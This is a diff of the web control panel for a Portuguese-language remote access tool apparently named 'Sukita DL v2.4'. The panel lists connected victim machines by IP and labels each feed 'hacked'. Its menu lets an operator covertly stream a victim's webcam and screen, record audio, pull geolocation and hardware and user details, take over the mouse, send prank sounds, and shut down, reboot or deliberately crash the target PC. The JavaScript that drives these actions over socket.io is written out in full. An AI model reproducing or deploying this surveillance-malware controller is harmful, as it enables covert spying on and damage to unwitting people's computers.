@@ -1,763 +1,183 @@
-<!--
---[[   _____   __    __    __   ___    _____   ________     ____ --]]
---[[  / ____\  ) )  ( (   () ) / __)  (_   _) (___  ___)   (    ) --]]
---[[ ( (___   ( (    ) )  ( (_/ /       | |       ) )      / /\ \ --]]
---[[  \___ \   ) )  ( (   ()   (        | |      ( (      ( (__) ) --]]
---[[      ) ) ( (    ) )  () /\ \       | |       ) )      )    ( --]]
---[[  ___/ /   ) \__/ (   ( (  \ \     _| |__    ( (      /  /\  \ --]]
---[[ /____/    \______/   ()_)  \_\   /_____(    /__\    /__(  )__\ --]]
-
---[[ 𝐩𝐚𝐫𝐚𝐛𝐞𝐧𝐬 𝐯𝐨𝐜𝐞 𝐚𝐜𝐞𝐬𝐬𝐨𝐮 𝐨 𝐩𝐚𝐢𝐧𝐞𝐥 𝐚𝐝𝐦 𝐝𝐞𝐬𝐜𝐨𝐛𝐫𝐞 𝐚 𝐬𝐞𝐧𝐡𝐚 𝐚𝐠𝐨𝐫𝐚 𝐪 𝐬𝐞 𝐞𝐧𝐭𝐫𝐚 --]]
--->
-
-<!-- Sukita is the main of DL – v2.4 -->
-<!-- Sukita is the main of DL – v2.4 -->
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Sukita is the main of DL</title>
-
-  <!-- Ícone -->
-  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRt0Knrsk0bL7_3EMrM_TE7G5GCp6RDVgMdRQ&s" type="image/png">
-
-  <!-- Bootstrap · FontAwesome · Animate.css -->
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
-
-  <!-- Leaflet (mapa) -->
-  <link href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" rel="stylesheet">
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
-  <style>
-    /* ─────────── Tema Neon-Pulse ─────────── */
-    :root{
-      --bg1:#0b0d13; --bg2:#131720; --stroke:#212837;
-      --txt:#ced3e6; --muted:#828ca3; --accent:#a809bd;
-      --accent2:#e29608; --danger:#ff3b3b;
-      --radius:.8rem; --mono:'Fira Code',monospace; --sans:'Montserrat',sans-serif;
-      --shadow:0 12px 32px -14px rgba(0,0,0,.8);
-    }
-    @keyframes gradientShift{0%{background-position:0 0}50%{background-position:400% 0}100%{background-position:0 0}}
-    html,body{
-      height:100%;margin:0;
-      background:linear-gradient(120deg,#1d0524 0%,#021b2c 25%,#0b0124 50%,#021b2c 75%,#1d0524 100%);
-      background-size:400% 400%;animation:gradientShift 28s ease infinite;
-      font-family:var(--sans);color:var(--txt);
-    }
-    body.locked{overflow:hidden}
-    *::-webkit-scrollbar{width:6px;height:6px}
-    *::-webkit-scrollbar-thumb{background:var(--accent2);border-radius:3px}
-
-    /* util */
-    .badge.bg-accent2{background:var(--accent2)!important;color:#000}
-    .btn-accent{background:var(--accent);border:none;color:#fff}
-    .btn-accent:hover{background:#e29608}
-
-    /* Splash */
-    #splash{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;z-index:9999;background:#000;color:var(--accent2)}
-    #splash i{font-size:5rem;animation:pulse 2s infinite alternate}
-    @keyframes pulse{from{transform:scale(.9)}to{transform:scale(1.1)}}
-
-    /* Login */
-    #login{display:flex;align-items:center;justify-content:center;height:100vh}
-    .login-card{
-      background:var(--bg2);border:1px solid var(--stroke);border-radius:var(--radius);
-      box-shadow:var(--shadow);padding:2.5rem 3rem;width:100%;max-width:420px
-    }
-    .login-card h4{font-family:var(--mono);color:var(--accent2)}
-    .login-card input{
-      background:var(--bg1);border:1px solid var(--stroke);color:var(--txt);
-      border-radius:.45rem;font-family:var(--mono)
-    }
-    .login-card input:focus{border-color:var(--accent)}
-    .form-check-input:checked{background-color:var(--accent);border-color:var(--accent)}
-
-    /* Navbar */
-    .navbar{
-      background:rgba(0,0,0,.45);backdrop-filter:blur(6px);
-      border-bottom:1px solid var(--stroke);box-shadow:var(--shadow)
-    }
-    .navbar-brand{font-family:var(--mono);font-weight:600;color:var(--accent2)}
-
-    /* Sidebar */
-    .sidebar{
-      width:240px;background:rgba(0,0,0,.45);backdrop-filter:blur(6px);
-      border-right:1px solid var(--stroke)
-    }
-    .client-row{
-      display:flex;align-items:center;gap:.6rem;padding:.5rem .9rem;margin:.12rem .5rem;
-      border-radius:calc(var(--radius)-.25rem);cursor:pointer;font-size:.86rem;
-      font-family:var(--mono);transition:background .15s
-    }
-    .client-row:hover{background:rgba(0,224,255,.07)}
-    .client-row i{width:22px;text-align:center;color:var(--accent2)}
-
-    /* Viewer cards */
-    #viewer{
-      display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));
-      gap:1.4rem;padding:1.6rem;overflow-y:auto
-    }
-    .card-feed{
-      position:relative;border-radius:var(--radius);overflow:hidden;border:1px solid var(--stroke);
-      background:var(--bg2);box-shadow:var(--shadow);
-      transition:transform .25s,box-shadow .25s
-    }
-    .card-feed:hover{transform:translateY(-6px) scale(1.02);box-shadow:0 18px 32px -10px rgba(0,224,255,.35)}
-    .card-feed img{display:block;width:100%;height:200px;object-fit:cover;filter:brightness(.9)}
-    .ip-label{
-      position:absolute;top:0;left:0;width:100%;padding:.28rem .5rem;font-size:.75rem;
-      background:rgba(0,0,0,.8);border-bottom:1px solid var(--stroke);text-align:center;
-      font-family:var(--mono);color:var(--accent2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis
-    }
-    .overlay{
-      position:absolute;bottom:.5rem;left:.6rem;background:rgba(0,0,0,.65);padding:.22rem .65rem;
-      border-radius:.35rem;font-size:.72rem;font-family:var(--mono)
-    }
-    .btn-bar{position:absolute;top:calc(28px + .6rem);right:.8rem;display:flex;gap:.45rem}
-    .btn-glass{
-      width:36px;height:36px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;
-      background:rgba(255,0,124,.12);border:1px solid rgba(255,0,124,.35);color:var(--accent);
-      backdrop-filter:blur(3px);transition:background .15s,border .15s
-    }
-    .btn-glass:hover{background:rgba(255,0,124,.22);border-color:rgba(255,0,124,.55)}
-
-    /* Menu botões */
-    .menu-box{
-      background:var(--bg2);border:1px solid var(--stroke);border-radius:var(--radius);
-      box-shadow:var(--shadow);padding:2rem 2.5rem;min-width:320px;max-height:80vh;overflow-y:auto
-    }
-    .menu-box h5{color:var(--accent);font-family:var(--mono);margin-bottom:1.4rem;text-align:center}
-    .menu-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:1rem}
-    .menu-btn{
-      display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1rem .5rem;
-      border-radius:var(--radius);background:rgba(0,224,255,.1);border:1px dashed var(--accent2);
-      color:var(--txt);font-family:var(--mono);font-size:.9rem;gap:.55rem;cursor:pointer;
-      transition:all .18s;text-decoration:none
-    }
-    .menu-btn i{font-size:1.5rem;color:var(--accent2)}
-    .menu-btn:hover{background:rgba(0,224,255,.18);transform:translateY(-3px) scale(1.03);box-shadow:0 8px 18px -8px rgba(0,224,255,.4)}
-    .danger-btn{background:rgba(255,59,59,.1);border-color:var(--danger);color:var(--danger)}
-    .danger-btn i{color:var(--danger)}
-    .danger-btn:hover{background:rgba(255,59,59,.2)}
-    .info-btn{background:rgba(0,224,255,.1);border-color:var(--accent2);color:var(--accent2)}
-    .info-btn:hover{background:rgba(0,224,255,.18)}
-    .close-x{
-      position:absolute;top:1.1rem;right:1.3rem;background:none;border:none;color:var(--muted);
-      font-size:1.4rem;cursor:pointer
-    }
-    .close-x:hover{color:var(--accent)}
-
-    /* Toast */
-    .toast{backdrop-filter:blur(4px)}
-    .toast-primary{background:var(--accent2)!important;color:#000}
-    .toast-danger{background:var(--danger)!important}
-
-    /* overlays/bubble */
-    .overlay-back{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:8000}
-    .overlay-back.show{display:flex}
-    .fab{position:fixed;bottom:1.5rem;right:1.5rem;z-index:7500}
-    .bubble{
-      background:linear-gradient(135deg,var(--accent2),var(--accent));padding:.65rem 1.3rem;color:#000;
-      font-family:var(--mono);font-weight:700;border-radius:50px;cursor:pointer;display:inline-flex;
-      align-items:center;gap:.5rem;box-shadow:var(--shadow);transition:transform .2s
-    }
-    .bubble:hover{transform:translateY(-4px)}
-
-    /* mapa no modal */
-    #infoMap{height:260px;border-radius:.5rem;overflow:hidden;margin-top:.75rem}
-
-    /* Offcanvas */
-    .offcanvas{background:var(--bg2);border-left:1px solid var(--stroke)}
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sukita v2.4 - Admin</title>
+<style>
+  :root {
+    --bg:#121212; --fg:#eee;
+    --accent:#0af; --danger:#f33;
+    --card-bg:#1e1e1e; --radius:8px;
+  }
+  body,html {margin:0;padding:0;height:100%;background:var(--bg);color:var(--fg);font-family:sans-serif}
+  .navbar {height:50px;background:#181818;display:flex;align-items:center;padding:0 10px;box-shadow:0 2px 4px rgba(0,0,0,0.5)}
+  .sidebar {width:220px;background:#181818;overflow-y:auto;padding:10px}
+  .sidebar .client {padding:6px 10px;border-radius:4px;cursor:pointer}
+  .sidebar .client:hover {background:#222}
+  #count {background:var(--accent);padding:2px 6px;border-radius:4px}
+  #viewer {display:flex;flex-wrap:wrap;gap:10px;padding:10px;overflow-y:auto;flex:1;background:#111}
+  .card {position:relative; background:var(--card-bg);border-radius:var(--radius);overflow:hidden;width:320px;height:200px;display:flex;flex-direction:column}
+  .card img {flex:1;width:100%;object-fit:cover}
+  .card .info {padding:6px;font-size:12px;background:rgba(0,0,0,0.5)}
+  .btn-bar {position:absolute;top:6px;right:6px;display:flex;gap:4px}
+  .btn {width:24px;height:24px;background:rgba(255,255,255,0.1);border:none;border-radius:4px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#ccc}
+  .btn:hover {background:rgba(255,255,255,0.2)}
+  .overlay {position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center}
+  .menu {background:var(--card-bg);padding:15px;border-radius:8px;display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+  .menu .item {padding:10px;background:#222;border-radius:6px;text-align:center;cursor:pointer;font-size:12px}
+  .menu .item:hover {background:#333}
+  .modal {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:var(--card-bg);padding:15px;border-radius:8px;display:none;max-width:90%;max-height:80%;overflow:auto}
+  .modal h5 {margin-top:0}
+  .toast {position:fixed;bottom:10px;right:10px;background:var(--accent);color:#000;padding:8px 12px;border-radius:4px;opacity:0.9;margin-top:6px}
+</style>
 </head>
-<body class="locked">
+<body>
 
-  <!-- Splash -->
-  <div id="splash">
-    <i class="fa-solid fa-book-skull"></i>
-    <span class="mt-3">Loading… <strong style="color:#e29608">Sukita is the main of DL</strong></span>
-  </div>
-
-  <!-- Login -->
-  <div id="login">
-    <div class="login-card animate__animated animate__fadeInDown">
-      <h4 class="mb-4 text-center"><i class="fa-solid fa-user-shield me-2"></i>Loga ai doido</h4>
-      <input id="user" class="form-control mb-3" placeholder="Usuário">
-      <input id="pass" type="password" class="form-control mb-2" placeholder="Senha">
-      <div class="form-check mb-4">
-        <input class="form-check-input" type="checkbox" id="rememberMe">
-        <label class="form-check-label small" for="rememberMe">Lembrar o login?</label>
-      </div>
-      <button class="btn btn-accent w-100 btn-login">Entrar</button>
-      <div id="error" class="text-danger mt-3 d-none text-center small">Credenciais inválidas</div>
-    </div>
-  </div>
-
-  <!-- Painel -->
-  <div id="panel" style="display:none;height:100vh" class="animate__animated animate__fadeIn">
-    <nav class="navbar navbar-dark px-3">
-      <span class="navbar-brand">
-        <i class="fa-solid fa-scarecrow"></i>
-        <strong style="color:#e29608">Sukita is the main of DL </strong>
-        <strong style="color:#3bff76">v2.4</strong>
-      </span>
-      <button class="btn btn-outline-light btn-sm" data-bs-toggle="offcanvas" data-bs-target="#configCanvas" title="Configurações">
-        <i class="fa-solid fa-gear"></i>
-      </button>
-    </nav>
-    <div class="d-flex" style="height:calc(100% - 56px)">
-      <aside class="sidebar p-3">
-        <h6 class="fw-semibold mb-3">Conectados agora: <span id="count" class="badge bg-accent2">0</span></h6>
-        <div id="list"></div>
-      </aside>
-      <main class="flex-grow-1 position-relative">
-        <div id="viewer"></div>
-      </main>
-    </div>
-  </div>
-
-  <!-- Off-canvas Configurações -->
-  <div class="offcanvas offcanvas-end" id="configCanvas" tabindex="-1">
-    <div class="offcanvas-header">
-      <h5 class="offcanvas-title"><i class="fa-solid fa-gear me-2"></i>Configurações</h5>
-      <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"></button>
-    </div>
-    <div class="offcanvas-body small">
-      <button id="logoutBtn" class="btn btn-outline-danger w-100">
-        <i class="fa-solid fa-right-from-bracket me-2"></i>Deslogar
-      </button>
-    </div>
-  </div>
-
-  <!-- Overlay Ações -->
-  <div id="actionMenu" class="overlay-back">
-    <div class="menu-box position-relative">
-      <button class="close-x" onclick="closeOverlay('actionMenu')"><i class="fa-solid fa-xmark"></i></button>
-      <h5 id="menuTitle">ActionMenu:</h5>
-      <div class="menu-grid">
-        <div class="menu-btn" data-action="cam"><i class="fa-solid fa-video"></i><span>Ver cam</span></div>
-        <div class="menu-btn" data-action="screen"><i class="fa-solid fa-desktop"></i><span>Ver tela</span></div>
-        <div class="menu-btn" data-action="stop-cam"><i class="fa-solid fa-video-slash"></i><span>Stop cam</span></div>
-        <div class="menu-btn" data-action="stop-screen"><i class="fa-solid fa-ban"></i><span>Stop tela</span></div>
-        <div class="menu-btn" data-action="rec-audio"><i class="fa-solid fa-microphone"></i><span>Gravar áudio</span></div>
-        <div class="menu-btn" data-action="stop-audio"><i class="fas fa-volume-mute"></i><span>Stop áudio</span></div>
-        <div class="menu-btn" data-action="download-audio"><i class="fa-solid fa-wifi"></i><span>Site de áudios</span></div>
-        <div class="menu-btn" data-action="upload-audio"><i class="fa-solid fa-upload"></i><span>Exportar áudio</span></div>
-        <div class="menu-btn" data-action="troll-audio"><i class="fa-solid fa-paper-plane"></i><span>Enviar áudio</span></div>
-        <div class="menu-btn info-btn" data-action="info"><i class="fa-solid fa-map-location-dot"></i><span>Pegar infos</span></div>
-        <div class="menu-btn danger-btn" data-action="crash"><i class="fa-solid fa-bug"></i><span>Crashar tudo kkkkk</span></div>
-<div class="menu-btn info-btn" data-action="hwinfo">
-  <i class="fa-solid fa-microchip"></i><span>HW Info</span>
-</div>
-<div class="menu-btn danger-btn" data-action="shutdown">
-  <i class="fa-solid fa-power-off"></i><span>Desligar</span>
-</div>
-<div class="menu-btn danger-btn" data-action="reboot">
-  <i class="fa-solid fa-rotate"></i><span>Reiniciar</span>
+<div class="navbar">
+  <span>Sukita DL v2.4</span>
+  <span style="margin-left:auto">Online: <span id="count">0</span></span>
 </div>
 
-      </div>
-    </div>
-  </div>
+<div style="display:flex;height:calc(100% - 50px)">
+  <div class="sidebar"><div id="list"></div></div>
+  <div id="viewer"></div>
+</div>
 
-  <!-- Overlay Scripts -->
-  <div id="scriptsOverlay" class="overlay-back">
-    <div class="menu-box position-relative">
-      <button class="close-x" onclick="closeOverlay('scriptsOverlay')"><i class="fa-solid fa-xmark"></i></button>
-      <h5>Scripts</h5>
-      <div class="d-grid gap-3">
-        <a href="https://manus.im/" target="_blank" class="menu-btn">
-          <i class="fa-solid fa-link"></i><span>MANUS.IM</span>
-        </a>
-        <a href="https://pastebin.com/raw/mNtFVJJa" target="_blank" class="menu-btn">
-          <i class="fa-solid fa-link"></i><span>Infos do MANUS.IM</span>
-        </a>
-        <a href="https://saporraesukita.netlify.app" target="_blank" class="menu-btn">
-          <i class="fa-solid fa-link"></i><span>Script de tarefa <strong style="color:#c4b213">TESTING</strong></span>
-        </a>
-      </div>
-    </div>
-  </div>
-
-  <!-- Modal Infos -->
-  <div class="modal fade" id="infoModal" tabindex="-1">
-    <div class="modal-dialog modal-dialog-centered modal-lg">
-      <div class="modal-content bg-dark text-white border-0">
-        <div class="modal-header border-0">
-          <h5 class="modal-title"><i class="fa-solid fa-circle-info me-2"></i>Informações do dispositivo</h5>
-          <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-        </div>
-        <div class="modal-body">
-          <ul class="small mb-3">
-            <li><strong>IP:</strong> <span id="infoIp">-</span></li>
-            <li><strong>UUID:</strong> <span id="infoUuid">-</span></li>
-            <li><strong>Latitude:</strong> <span id="infoLat">-</span></li>
-            <li><strong>Longitude:</strong> <span id="infoLon">-</span></li>
-            <li><strong>Precisão:</strong> <span id="infoAcc">-</span> m</li>
-            <li><strong>Atualizado:</strong> <span id="infoTime">-</span></li>
-          </ul>
-          <div id="infoMap" class="bg-secondary rounded"></div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-<!-- Modal HW Info -->
-<div class="modal fade" id="hwModal" tabindex="-1">
-  <div class="modal-dialog modal-dialog-centered">
-    <div class="modal-content bg-dark text-white border-0">
-      <div class="modal-header border-0">
-        <h5 class="modal-title">
-          <i class="fa-solid fa-microchip me-2"></i>Hardware
-        </h5>
-        <button class="btn-close btn-close-white"
-                data-bs-dismiss="modal"></button>
-      </div>
-      <div class="modal-body">
-        <pre id="hwPre" class="small mb-0"></pre>
-      </div>
-    </div>
+<div class="overlay" id="actionMenu">
+  <div class="menu" id="menuGrid">
+    <div class="item" data-act="cam">Câmera</div>
+    <div class="item" data-act="screen">Tela</div>
+    <div class="item" data-act="stop-cam">Parar Cam</div>
+    <div class="item" data-act="stop-screen">Parar Tela</div>
+    <div class="item" data-act="info">Info</div>
+    <div class="item" data-act="hwinfo">HW Info</div>
+    <div class="item" data-act="shutdown">Desligar</div>
+    <div class="item" data-act="reboot">Reiniciar</div>
+    <div class="item" data-act="crash" style="color:var(--danger)">Crash!</div>
   </div>
 </div>
 
+<div class="modal" id="infoModal">
+  <h5>Info do dispositivo</h5>
+  <pre id="infoPre" style="font-size:12px"></pre>
+  <button onclick="closeModal('infoModal')">Fechar</button>
+</div>
 
+<div id="toastContainer"></div>
 
-  <!-- Modal Crash -->
-  <div class="modal fade" id="crashModal" tabindex="-1">
-    <div class="modal-dialog modal-dialog-centered">
-      <div class="modal-content bg-danger text-white border-0">
-        <div class="modal-header border-0">
-          <h5 class="modal-title"><i class="fa-solid fa-triangle-exclamation me-2"></i>ATENÇÃO</h5>
-          <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-        </div>
-        <div class="modal-body">
-          Tem certeza que deseja usar esta opção?<br>Ela pode travar, dar tela azul ou danificar o PC alvo!
-        </div>
-        <div class="modal-footer border-0">
-          <button class="btn btn-light" data-bs-dismiss="modal">Cancelar</button>
-          <button class="btn btn-dark" id="confirmCrash">Usar mesmo assim</button>
-        </div>
-      </div>
-    </div>
-  </div>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+let cache = {}, currentUUID;
+const socket = io({query:{role:'admin'}});
+const listEl = document.getElementById('list');
+const viewer = document.getElementById('viewer');
 
-  <!-- Modal Gravar áudio -->
-  <div class="modal fade" id="recordModal" tabindex="-1">
-    <div class="modal-dialog modal-dialog-centered">
-      <div class="modal-content bg-dark text-white border-0">
-        <div class="modal-header border-0">
-          <h5 class="modal-title">Gravar áudio</h5>
-          <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-        </div>
-        <div class="modal-body text-center">
-          <button id="recordBtn" class="btn btn-danger">
-            <i class="fas fa-microphone"></i> Gravar
-          </button>
-          <button id="stopBtn" class="btn btn-secondary d-none">
-            <i class="fas fa-stop"></i> Parar
-          </button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Modal Atualizações -->
-  <div class="modal fade" id="updatesModal" tabindex="-1">
-    <div class="modal-dialog modal-dialog-centered">
-      <div class="modal-content">
-        <div class="modal-header">
-          <h5 class="modal-title">
-            <strong style="color:#e29608">Sukita is the main of DL <strong style="color:#4908e2">ATUALIZADO v2.4</strong></strong>
-          </h5>
-          <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
-        </div>
-        <div class="modal-body">
-          <ul>
-            <p><strong style="color:#e20808">- Nova opção de Crashar</strong></p>
-            <p><strong>- Melhorias de otimização</strong></p>
-            <p><strong>- Melhorias no visual</strong></p>
-            <p><strong style="color:#088be2">- Atraso configurável para áudios</strong></p>
-            <p><strong style="color:#088be2">- Lista de áudios prontos</strong></p>
-          </ul>
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="bubble" id="updatesLinkBtn">Sukita script</button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Modal Selecionar áudio -->
-  <div class="modal fade" id="selectAudioModal" tabindex="-1">
-    <div class="modal-dialog modal-dialog-centered">
-      <div class="modal-content bg-dark text-white border-0">
-        <div class="modal-header border-0">
-          <h5 class="modal-title"><i class="fa-solid fa-music me-2"></i>Enviar áudio</h5>
-          <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-        </div>
-        <div class="modal-body">
-          <div id="audioList" class="list-group mb-3"></div>
-          <div class="mb-3">
-            <label class="form-label">Atraso (segundos):</label>
-            <input type="number" id="audioDelay" class="form-control" min="0" value="0">
-          </div>
-          <button id="sendReadyAudio" class="btn btn-accent w-100">Enviar</button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Toast container -->
-  <div class="toast-container position-fixed top-0 end-0 p-3"></div>
-
-  <!-- FAB Scripts -->
-  <div class="fab">
-    <div class="bubble" id="scriptsBubble">
-      <i class="fa-solid fa-code"></i>Acessar Scripts
-    </div>
-  </div>
-
-  <!-- File input (áudio) -->
-  <input type="file" id="audioFile" accept="audio/*" class="d-none">
-
-  <!-- ========= SCRIPTS ========= -->
-  <script src="/socket.io/socket.io.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-  <script>
-  /* ===== Helpers ===== */
-  const socket = io({query:{role:'admin'}});
-  const $ = id => document.getElementById(id);
-  const TOKEN_KEY='sukita_token';
-  const toast = (msg,type='primary')=>{
-    const el=document.createElement('div');
-    el.className=`toast text-white bg-${type} border-0`;
-    el.innerHTML=`<div class='toast-body'>${msg}</div>`;
-    document.querySelector('.toast-container').appendChild(el);
-    bootstrap.Toast.getOrCreateInstance(el,{delay:2400}).show();
-    el.addEventListener('hidden.bs.toast',()=>el.remove());
-  };
-  const os = ua => /Windows NT/.test(ua)?'Windows':/Mac OS X/.test(ua)?'macOS':
-                   /Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':
-                   /Linux/.test(ua)?'Linux':'—';
-
-  /* ===== Splash + login persistente ===== */
-  const loginOk = ()=>{
-    document.body.classList.remove('locked');
-    $('login').style.display='none';
-    $('splash').style.display='flex';
-    setTimeout(()=>{
-      $('splash').style.display='none';
-      $('panel').style.display='block';
-      bootstrap.Modal.getOrCreateInstance('#updatesModal').show();
-    },1500);
-  };
-  if(localStorage.getItem(TOKEN_KEY)==='ok') loginOk();
-
-  document.querySelector('.btn-login').onclick = ()=>{
-    const u=$('user').value.trim(), p=$('pass').value.trim();
-    if(u==='admin' && p==='0312'){
-      if($('rememberMe').checked) localStorage.setItem(TOKEN_KEY,'ok');
-      loginOk();
-    }else $('error').classList.remove('d-none');
-  };
-  $('logoutBtn').onclick=()=>{ localStorage.removeItem(TOKEN_KEY); location.reload(); };
-
-  /* ===== Overlay helpers ===== */
-  const openOverlay = id => $(id).classList.add('show');
-  const closeOverlay = id => $(id).classList.remove('show');
-  $('scriptsBubble').onclick = ()=>openOverlay('scriptsOverlay');
-
-  /* ===== Áudios prontos (Google) ===== */
-  const readyAudios = [
-    {name:'Beep Alarm',        url:'https://actions.google.com/sounds/v1/alarms/beep_short.ogg'},
-    {name:'Alarm Clock',       url:'https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg'},
-    {name:'Spaceship Alarm',   url:'https://actions.google.com/sounds/v1/alarms/spaceship_alarm.ogg'},
-    {name:'Clown Horn',        url:'https://actions.google.com/sounds/v1/cartoon/clown_horn.ogg'}
-  ];
-  const refreshAudioList = ()=>{
-    const list=$('audioList'); list.innerHTML='';
-    readyAudios.forEach((a,i)=>{
-      list.insertAdjacentHTML('beforeend',`
-        <label class="list-group-item d-flex align-items-center gap-2">
-          <input class="form-check-input me-2" type="radio" name="readyAudio" value="${i}" ${i===0?'checked':''}>
-          <span>${a.name}</span>
-        </label>`);
-    });
-  };
-  $('sendReadyAudio').onclick=()=>{
-    const idx=[...document.querySelectorAll('input[name="readyAudio"]')].find(r=>r.checked)?.value;
-    if(idx==null) return;
-    const delay=Math.max(0,parseInt($('audioDelay').value)||0);
-    socket.emit('ready-audio',{uuid:currentUUID,url:readyAudios[idx].url,delay});
-    bootstrap.Modal.getInstance('#selectAudioModal').hide();
-    toast('Áudio enviado');
-  };
-
-  /* ===== Listagem de clientes ===== */
-  const cache={}, activeCam={}, activeScreen={};
-  socket.on('clients', arr=>{
-    $('count').textContent=arr.length;
-    $('list').innerHTML='';
-    arr.forEach(c=>{
-      cache[c.uuid]=c;
-      $('list').insertAdjacentHTML('beforeend',
-        `<div class="client-row" data-uuid="${c.uuid}">
-           <i class="fa-solid fa-eye"></i><span>${c.ip}</span>
-         </div>`);
-    });
-  });
-  socket.on('frame',d=>$('img-'+d.id)?.setAttribute('src',d.data));
-  socket.on('screen-frame',d=>$('screen-img-'+d.id)?.setAttribute('src',d.data));
-/* ── recebe HW info do servidor ── */
-socket.on('hwinfo-update', ({uuid, info})=>{
-  cache[uuid].hwinfo = info;          // salva no cache
-  if (uuid !== currentUUID) return;   // só mostra se for o alvo atual
-
-  /* formata & insere no <pre> */
-  $('hwPre').textContent = `
-Host:   ${info.hostname}
-User:   ${info.user}
-HWID:   ${info.hwid}
-
-OS:     ${info.os}
-CPU:    ${info.cpu}  (${info.cpu_load}%)
-RAM:    ${info.ram_free}/${info.ram_tot}  GB
-Disk:   ${info.disk_free}/${info.disk_tot}  GB
-LAN IP: ${info.ip_local}`.trim();
-
-  bootstrap.Modal.getOrCreateInstance('#hwModal').show();
-});
-
-  /* ===== Clique no cliente ===== */
-  let currentUUID=null;
-  $('list').addEventListener('click',e=>{
-    const row=e.target.closest('.client-row'); if(!row) return;
-    currentUUID=row.dataset.uuid;
-    $('menuTitle').textContent=`Menu de: ${cache[currentUUID].ip}`;
-    openOverlay('actionMenu');
-  });
-
-
-
-  /* ===== Menu de ações ===== */
-  $('actionMenu').addEventListener('click',e=>{
-    const btn=e.target.closest('.menu-btn'); if(!btn) return;
-    const act=btn.dataset.action; closeOverlay('actionMenu');
-    switch(act){
-      case 'cam':         startStream('cam');        break;
-      case 'screen':      startStream('screen');     break;
-      case 'stop-cam':    stopStream('cam');         break;
-      case 'stop-screen': stopStream('screen');      break;
-      case 'rec-audio':   bootstrap.Modal.getOrCreateInstance('#recordModal').show(); break;
-      case 'stop-audio':  socket.emit('stop-audio',currentUUID); toast('Áudio parado','secondary'); break;
-      case 'download-audio': window.open('https://www.myinstants.com/pt/search/?name=MEME','_blank'); break;
-      case 'upload-audio': $('audioFile').click(); break;
-      case 'troll-audio': refreshAudioList(); bootstrap.Modal.getOrCreateInstance('#selectAudioModal').show(); break;
-      case 'info':        showInfo(); break;
-      case 'crash':       bootstrap.Modal.getOrCreateInstance('#crashModal').show(); break;
-      case 'hwinfo':
-  socket.emit('request-hwinfo', currentUUID);
-  toast('HW info requisitada');
-  break;
-
-case 'shutdown':
-  socket.emit('shutdown', currentUUID);
-  toast('Shutdown enviado', 'danger');
-  break;
-
-case 'reboot':
-  socket.emit('reboot', currentUUID);
-  toast('Reboot enviado', 'danger');
-  break;
-
-    }
-  });
-
-  /* ===== Streams ===== */
-  const mkCard = (uuid,kind)=>{
-    const c=cache[uuid];
-    const card=document.createElement('div');
-    card.className='card-feed animate__animated animate__zoomIn';
-    card.id=`${kind==='cam'?'cam':'screen'}-${uuid}`;
-    card.innerHTML=`
-      <div class="ip-label">${c.ip} | ${os(c.ua)} | hacked</div>
-      <img id="${kind==='cam'?'img-'+uuid:'screen-img-'+uuid}">
-      <div class="overlay">${kind==='cam'?'Câmera':'Tela'}</div>
-      <div class="btn-bar">
-        <button class="btn-glass btn-full"><i class="fa-solid fa-expand"></i></button>
-        <button class="btn-glass btn-min"><i class="fa-solid fa-minus"></i></button>
-        <button class="btn-glass btn-stop"><i class="fa-solid fa-xmark"></i></button>
-        <button class="btn-glass btn-ctl" title="Controle">
-  <i class="fa-solid fa-mouse-pointer"></i>
-</button>
-
-      </div>`;
-      // botão Controle: entra em modo remoto
-const ctlBtn = card.querySelector('.btn-ctl');
-ctlBtn.onclick = () => startRemoteControl(card, uuid);
-
-function startRemoteControl(card, uuid){
-  const img = card.querySelector('img');
-  // pede foco em tela cheia para capturar teclado
-  openFull(card);
-
-  /* ---- mouse ---- */
-  img.style.cursor='crosshair';
-  img.onmousemove = e=>{
-    const r = img.getBoundingClientRect();
-    const xp = (e.clientX - r.left) / r.width;   // 0‑1
-    const yp = (e.clientY - r.top ) / r.height;  // 0‑1
-    socket.emit('mouse-event', {uuid, ev:{type:'move', xp, yp}});
-  };
-  img.onclick = e=>{
-    socket.emit('mouse-event', {uuid, ev:{type:'click', btn:'left'}});
-  };
-  img.oncontextmenu = e=>{
-    e.preventDefault();
-    socket.emit('mouse-event', {uuid, ev:{type:'click', btn:'right'}});
-  };
